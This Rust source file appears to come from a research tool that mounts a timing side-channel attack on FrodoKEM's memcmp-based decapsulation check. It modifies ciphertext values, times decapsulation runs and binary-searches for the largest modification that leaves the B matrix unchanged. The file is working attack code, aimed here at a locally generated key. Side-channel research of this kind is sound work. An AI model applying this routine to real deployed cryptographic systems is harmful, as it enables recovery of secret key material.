use crate::attack::memcmp_frodo::MeasureSource;
use liboqs_rs_bindings as oqs;
use log::{debug, info, trace, warn};
use log_derive::{logfn, logfn_inputs};
use oqs::frodokem::FrodoKem;

enum Sign<T> {
    Plus(T),
    Minus(T),
}

/// Function that deterministically modifies the input vector.
///
/// To undo apply the same modification one more time
fn modify<FRODO: FrodoKem>(
    ct: &mut FRODO::Ciphertext,
    index_ij: usize,
    amount: Sign<u16>,
) -> Result<bool, String> {
    #![allow(non_snake_case)]
    trace!("started modify!");
    //Unpack the buffer into a pair of matrices encoded as a vector
    let (Bp, mut C) = FRODO::unpack(ct)?;
    let Cslice = FRODO::C_as_slice(&mut C);

    let tomod = &mut Cslice[index_ij];

    let res = match amount {
        Sign::Plus(a) => {
            // Check for overflow
            if FRODO::qmax() - a >= *tomod {
                *tomod += a;
                true
            } else {
                false
            }
        }
        Sign::Minus(a) => {
            if let Some(res) = Cslice[index_ij].checked_sub(a) {
                Cslice[index_ij] = res;
                true
            } else {
                trace!("{} - {} = ?", Cslice[index_ij], a);
                panic!("What is this? This should never happen!?");
            }
        }
    };

    if res {
        //Repack the matrices into the buffer
        FRODO::pack(Bp, C, ct)?;
    }

    Ok(res)
}

#[logfn(Trace)]
fn mod_measure<FRODO: FrodoKem>(
    amount: u16,
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: Option<u64>,
    ct: &mut FRODO::Ciphertext,
    ss: &mut FRODO::SharedSecret,
    sk: &mut FRODO::SecretKey,
) -> Result<Option<u64>, String> {
    //Modify
    if modify::<FRODO>(ct, index_ij, Sign::Plus(amount))? {
        let mut lowest = u64::max_value();
        'sample: for _ in 0..iterations {
            let m = measure_source.measure(|| FRODO::decaps_measure(ct, ss, sk));
            if let Some(time) = m? {
                if time < lowest {
                    lowest = time;
                    if let Some(t) = short_circuit_threshold {
                        if lowest < t {
                            break 'sample;
                        }
                    }
                }
            };
        }
        //Unmodify
        modify::<FRODO>(ct, index_ij, Sign::Minus(amount))?;
        Ok(Some(lowest))
    } else {
        // We could not modify due to overflow, we report this and try a lower number
        Ok(None)
    }
}

#[logfn_inputs(Trace)]
pub fn find_e<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    info!(
        "Launching the find_e routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::zero_pk();
    let mut secret_key = FRODO::zero_sk();
    let mut ciphertext = FRODO::zero_ct();
    let mut maxmod = FRODO::qmax();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    info!("Encapsulating shared secret and generating ciphertext");
    let mut shared_secret_e = FRODO::zero_ss();
    let mut shared_secret_d = FRODO::zero_ss();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    let warmuptime = mod_measure::<FRODO>(
        0,
        0,
        warmup,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;
    debug!("Warmup time {}", warmuptime.unwrap());

    info!("Running {} iterations with a low {} cipertext modification at the start of C to establish upper bound timing threshold.", iterations, 1);
    let threshold_high = mod_measure::<FRODO>(
        1,
        0,
        iterations,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?
    .unwrap();

    info!("Running {} iterations with a very major cipertext modification at the end of C to establish lower bound timing threshold.", iterations);
    let threshold_low = loop {
        if let Some(t) = mod_measure::<FRODO>(
            maxmod,
            0,
            iterations,
            &measure_source,
            None,
            &mut ciphertext,
            &mut shared_secret_d,
            &mut secret_key,
        )? {
            break t;
        } else {
            maxmod -= 1;
        }
    };
    info!(
        "Used {} as the maximum value to add to C_2' at index 0.",
        maxmod
    );

    let threshold = (threshold_high + threshold_low) / 2;
    info!(
        "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold
    );

    info!("Starting binary search for determining maximum modifications to C without changing B.");

    let mut high = maxmod; //flipping one bit .len() all bytes appear to be a good start position for the uppper limit
    let mut low = 0;
    let maxmod = loop {
        let currentmod = (high + high + low) / 3;
        debug!("high: {}, low: {}", high, low);
        info!(
            "Testing {} bitflips with {} iterations",
            currentmod, iterations
        );
        let time = mod_measure::<FRODO>(
            currentmod,
            0,
            iterations,
            &measure_source,
            Some(threshold),
            &mut ciphertext,
            &mut shared_secret_d,
            &mut secret_key,
        )?;

        if let Some(time) = time {
            debug!("time measurment is {}", time);
            if time >= threshold {
                info!("Raising lowerbound to {}", currentmod);
                low = currentmod;
            } else {
                info!("Lowering upperbound to {}", currentmod);
                high = currentmod;
            }
        } else {
            warn!("Got overflow, lowering upperbound to {}", currentmod);
            high = currentmod;
        }
        if high - low == 1 {
            break low;
        }
    };

    info!(
        "{} is the maximum amount of modifications that can be performed without affecting B",
        maxmod
    );

    Ok(())
}
